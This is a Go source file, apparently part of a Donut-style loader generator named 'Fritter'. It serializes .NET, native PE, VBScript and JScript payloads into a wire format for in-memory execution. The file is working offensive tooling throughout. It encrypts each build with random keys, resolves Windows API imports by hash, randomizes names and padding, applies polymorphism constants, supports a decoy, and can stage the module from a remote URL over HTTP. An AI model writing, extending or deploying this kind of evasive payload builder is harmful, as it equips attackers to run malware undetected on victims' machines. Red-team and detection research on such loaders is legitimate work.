package wire

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"math"
	"strings"
)

const (
	ModuleDotNetDLL        = 1
	ModuleDotNetExecutable = 2
	ModuleNativeDLL        = 3
	ModuleNativeExecutable = 4
	ModuleVBScript         = 5
	ModuleJScript          = 6

	moduleSize       = 1336
	moduleDataOffset = 1328
	instanceSize     = 4576
	instanceModOff   = 3240
	instanceCryptOff = 572
)

// Config describes one typed Fritter payload in the native loader's wire
// format. Entropy, Exit, and Headers use the C engine's 1-based constants.
type Config struct {
	Payload    []byte
	ModuleType int
	Runtime    string
	Domain     string
	Class      string
	Method     string
	Entropy    int
	Exit       int
	Headers    int
	Thread     bool
	OEP        uint32
	Decoy      string
	StagingURL string
	ModuleName string
	UTF8       bool
	Poly       Poly
	APIImports []APIImport
}

// Build serializes FRITTER_MODULE and FRITTER_INSTANCE, returning a staged
// module separately when StagingURL is set. It does not read or write files.
// The caller owns the returned byte slices.
func Build(config Config) (instance []byte, staged []byte, moduleName string, err error) {
	if len(config.Payload) == 0 {
		return nil, nil, "", fmt.Errorf("payload is empty")
	}
	if len(config.Payload) > math.MaxInt32-2*moduleSize {
		return nil, nil, "", fmt.Errorf("payload exceeds wire format size limit")
	}
	if config.Entropy == 0 {
		config.Entropy = 3
	}
	if config.Exit == 0 {
		config.Exit = 1
	}
	if config.Headers == 0 {
		config.Headers = 1
	}
	if config.Entropy < 1 || config.Entropy > 3 || config.Exit < 1 || config.Exit > 3 || config.Headers < 1 || config.Headers > 2 {
		return nil, nil, "", fmt.Errorf("invalid entropy, exit, or headers option")
	}
	if config.ModuleType < ModuleDotNetDLL || config.ModuleType > ModuleJScript {
		return nil, nil, "", fmt.Errorf("unsupported module type %d", config.ModuleType)
	}
	if config.ModuleType <= ModuleNativeExecutable {
		info, peErr := inspectPE(config.Payload, config.Method)
		if peErr != nil {
			return nil, nil, "", peErr
		}
		if info.moduleType != config.ModuleType {
			return nil, nil, "", fmt.Errorf("PE payload is module type %d, expected %d", info.moduleType, config.ModuleType)
		}
		if config.Runtime == "" {
			config.Runtime = info.runtime
		}
	}
	if err := validateConfigText(config); err != nil {
		return nil, nil, "", err
	}
	poly := config.Poly.normalized()
	if poly.CipherRounds == 0 || poly.HashRounds == 0 {
		return nil, nil, "", fmt.Errorf("invalid polymorphism constants")
	}
	imports := config.APIImports
	if imports == nil {
		imports = DefaultAPIImports
	}
	if len(imports) == 0 || len(imports) > 64 || imports[0].Name != "LoadLibraryA" {
		return nil, nil, "", fmt.Errorf("API import list must have 1..64 entries with LoadLibraryA first")
	}
	for _, imp := range imports {
		if imp.Module == "" || imp.Name == "" {
			return nil, nil, "", fmt.Errorf("API import contains an empty DLL or export name")
		}
	}

	var modPadByte, instPadByte [1]byte
	if _, err := rand.Read(modPadByte[:]); err != nil {
		return nil, nil, "", fmt.Errorf("module padding entropy: %w", err)
	}
	if _, err := rand.Read(instPadByte[:]); err != nil {
		return nil, nil, "", fmt.Errorf("instance padding entropy: %w", err)
	}
	modLen := moduleSize + len(config.Payload) + int(modPadByte[0])
	module := make([]byte, modLen)
	put32(module, 0, uint32(config.ModuleType))
	if config.Thread {
		put32(module, 4, 1)
	}
	put32(module, 8, 1) // FRITTER_COMPRESS_NONE: payload bytes are uncompressed.
	put32(module, 1320, uint32(len(config.Payload)))
	put32(module, 1324, uint32(len(config.Payload)))
	copy(module[moduleDataOffset:], config.Payload)
	if err := randomFill(module[moduleDataOffset+len(config.Payload) : moduleDataOffset+len(config.Payload)+int(modPadByte[0])]); err != nil {
		return nil, nil, "", fmt.Errorf("module padding: %w", err)
	}

	managed := config.ModuleType == ModuleDotNetDLL || config.ModuleType == ModuleDotNetExecutable
	if managed {
		if config.Domain == "" && config.Entropy != 1 {
			config.Domain, err = randomName(8)
			if err != nil {
				return nil, nil, "", err
			}
		}
		copyCString(module[12:268], config.Runtime)
		copyCString(module[268:524], config.Domain)
		if config.ModuleType == ModuleDotNetDLL {
			copyCString(module[524:780], config.Class)
			copyCString(module[780:1036], config.Method)
		}
	} else if config.ModuleType == ModuleNativeDLL {
		copyCString(module[780:1036], config.Method)
	}
	if config.ModuleType == ModuleNativeExecutable || managed {
		arg0 := "AAAA"
		if config.Entropy != 1 {
			arg0, err = randomName(4)
			if err != nil {
				return nil, nil, "", err
			}
		}
		copy(module[1036:1040], arg0)
		if managed {
			put32(module, 1292, 1) // Ignore the private synthetic argv[0].
		}
	}

	staging := config.StagingURL != ""
	if staging {
		moduleName = config.ModuleName
		if moduleName == "" {
			if config.Entropy == 1 {
				moduleName = "AAAAAAAA"
			} else {
				moduleName, err = randomName(8)
				if err != nil {
					return nil, nil, "", err
				}
			}
		}
		if len(moduleName) > 8 || strings.ContainsAny(moduleName, "/\\\x00") {
			return nil, nil, "", fmt.Errorf("invalid staging module name")
		}
		if !strings.HasSuffix(config.StagingURL, "/") {
			config.StagingURL += "/"
		}
		if len(config.StagingURL)+len(moduleName) > 255 {
			return nil, nil, "", fmt.Errorf("staging URL exceeds wire format size limit")
		}
	}
	instLen := instanceSize + int(instPadByte[0])
	if !staging {
		instLen += modLen
	}
	if instLen > math.MaxInt32 {
		return nil, nil, "", fmt.Errorf("instance exceeds wire format size limit")
	}
	instance = make([]byte, instLen)
	put32(instance, 0, uint32(instLen))
	put32(instance, 560, uint32(config.Exit))
	put32(instance, 564, uint32(config.Entropy))
	put32(instance, 568, config.OEP)
	put32(instance, 572, uint32(len(imports)))
	put32(instance, 1364, uint32(config.Headers))
	if config.UTF8 {
		put32(instance, 1368, 1)
	}
	put64(instance, 3232, uint64(modLen))
	copyCString(instance[576:832], "ole32;oleaut32;wininet;mscoree;shell32")
	copyCString(instance[1392:1912], config.Decoy)
	setPayloadStringsAndGUIDs(instance, config.ModuleType, config.Thread)
	if staging {
		put32(instance, 2152, 2) // FRITTER_INSTANCE_HTTP
		copyCString(instance[2156:2412], config.StagingURL+moduleName)
		copyCString(instance[2924:2932], "GET")
	} else {
		put32(instance, 2152, 1) // FRITTER_INSTANCE_EMBED
		copy(instance[instanceModOff:], module)
	}
	if err := randomFill(instance[instLen-int(instPadByte[0]):]); err != nil {
		return nil, nil, "", fmt.Errorf("instance padding: %w", err)
	}

	if config.Entropy == 3 {
		var instanceKey, instanceCTR, moduleKey, moduleCTR [16]byte
		if err := randomFill(instanceKey[:]); err != nil {
			return nil, nil, "", err
		}
		if err := randomFill(instanceCTR[:]); err != nil {
			return nil, nil, "", err
		}
		if err := randomFill(moduleKey[:]); err != nil {
			return nil, nil, "", err
		}
		if err := randomFill(moduleCTR[:]); err != nil {
			return nil, nil, "", err
		}
		copy(instance[4:20], instanceKey[:])
		copy(instance[20:36], instanceCTR[:])
		copy(instance[3200:3216], moduleKey[:])
		copy(instance[3216:3232], moduleCTR[:])
		sig, err := randomName(8)
		if err != nil {
			return nil, nil, "", err
		}
		copy(instance[2932:2940], sig)
		var iv [8]byte
		if err := randomFill(iv[:]); err != nil {
			return nil, nil, "", err
		}
		copy(instance[40:48], iv[:])
		mac := Maru(sig, binary.LittleEndian.Uint64(iv[:]), poly)
		put64(instance, 3192, mac)
		fillAPIHashes(instance, imports, binary.LittleEndian.Uint64(iv[:]), poly)
		if staging {
			put64(module, 1312, mac)
			Crypt(module, &moduleKey, &moduleCTR, poly)
		}
		Crypt(instance[instanceCryptOff:], &instanceKey, &instanceCTR, poly)
	} else {
		fillAPIHashes(instance, imports, 0, poly)
	}
	if staging {
		staged = module
	}
	return instance, staged, moduleName, nil
}

func validateConfigText(config Config) error {
	for _, field := range []struct {
		name, value string
		max         int
	}{
		{"runtime", config.Runtime, 255}, {"domain", config.Domain, 8},
		{"class", config.Class, 255}, {"method", config.Method, 255},
		{"decoy", config.Decoy, 519}, {"staging URL", config.StagingURL, 247},
	} {
		if len(field.value) > field.max || strings.IndexByte(field.value, 0) >= 0 {
			return fmt.Errorf("%s is too long or contains NUL", field.name)
		}
	}
	if config.ModuleType == ModuleDotNetDLL && (config.Class == "" || config.Method == "") {
		return fmt.Errorf("managed DLL requires class and method")
	}
	return nil
}

func copyCString(dst []byte, value string)    { copy(dst, value) }
func put32(dst []byte, off int, value uint32) { binary.LittleEndian.PutUint32(dst[off:], value) }
func put64(dst []byte, off int, value uint64) { binary.LittleEndian.PutUint64(dst[off:], value) }

func randomFill(dst []byte) error {
	if len(dst) == 0 {
		return nil
	}
	_, err := rand.Read(dst)
	return err
}

func randomName(length int) (string, error) {
	const alphabet = "HMN34P67R9TWCXYF"
	random := make([]byte, length)
	if err := randomFill(random); err != nil {
		return "", err
	}
	for i := range random {
		random[i] = alphabet[int(random[i])%len(alphabet)]
	}
	return string(random), nil
}

func fillAPIHashes(instance []byte, imports []APIImport, iv uint64, poly Poly) {
	for i, imp := range imports {
		value := Maru(imp.Name, iv, poly) ^ Maru(imp.Module, iv, poly)
		put64(instance, 48+i*8, value)
	}
}

func setPayloadStringsAndGUIDs(inst []byte, moduleType int, thread bool) {
	if moduleType == ModuleNativeExecutable {
		copyCString(inst[832:840], ".data")
		copyCString(inst[840:852], "kernelbase")
		copyCString(inst[852:1108], "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv")
		if thread {
			copyCString(inst[1108:1364], "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit")
		}
	}
	if moduleType == ModuleDotNetDLL || moduleType == ModuleDotNetExecutable {
		putGUID(inst, 1944, 0x9280188d, 0x0e8e, 0x4867, [8]byte{0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde})
		putGUID(inst, 1960, 0xD332DB9E, 0xB9B3, 0x4125, [8]byte{0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16})
		putGUID(inst, 1976, 0xBD39D1D2, 0xBA2F, 0x486a, [8]byte{0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91})
		putGUID(inst, 1992, 0xcb2f6723, 0xab3a, 0x11d2, [8]byte{0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e})
		putGUID(inst, 2008, 0xcb2f6722, 0xab3a, 0x11d2, [8]byte{0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e})
		putGUID(inst, 2024, 0x05F696DC, 0x2B29, 0x3663, [8]byte{0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13})
	}
	if moduleType == ModuleVBScript || moduleType == ModuleJScript {
		putGUID(inst, 1912, 0x00000000, 0x0000, 0x0000, [8]byte{0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46})
		putGUID(inst, 1928, 0x00020400, 0x0000, 0x0000, [8]byte{0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46})
		putGUID(inst, 2056, 0x91afbd1b, 0x5feb, 0x43f5, [8]byte{0xb0, 0x28, 0xe2, 0xca, 0x96, 0x06, 0x17, 0xec})
		putGUID(inst, 2072, 0xbb1a2ae1, 0xa4f9, 0x11cf, [8]byte{0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64})
		putGUID(inst, 2088, 0xdb01a1e3, 0xa42b, 0x11cf, [8]byte{0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64})
		putGUID(inst, 2104, 0xd10f6761, 0x83e9, 0x11cf, [8]byte{0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64})
		putGUID(inst, 2120, 0xbb1a2ae2, 0xa4f9, 0x11cf, [8]byte{0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64})
		putGUID(inst, 2136, 0xc7ef7658, 0xe1ee, 0x480e, [8]byte{0x97, 0xea, 0xd5, 0x2c, 0xb4, 0xd7, 0x6d, 0x17})
		if moduleType == ModuleVBScript {
			putGUID(inst, 2040, 0xB54F3741, 0x5B07, 0x11cf, [8]byte{0xA4, 0xB0, 0x00, 0xAA, 0x00, 0x4A, 0x55, 0xE8})
		} else {
			putGUID(inst, 2040, 0xF414C260, 0x6AC0, 0x11CF, [8]byte{0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58})
		}
		copyCString(inst[1372:1380], "WScript")
		copyCString(inst[1380:1392], "wscript.exe")
	}
}

func putGUID(dst []byte, off int, d1 uint32, d2, d3 uint16, d4 [8]byte) {
	put32(dst, off, d1)
	binary.LittleEndian.PutUint16(dst[off+4:], d2)
	binary.LittleEndian.PutUint16(dst[off+6:], d3)
	copy(dst[off+8:off+16], d4[:])
}
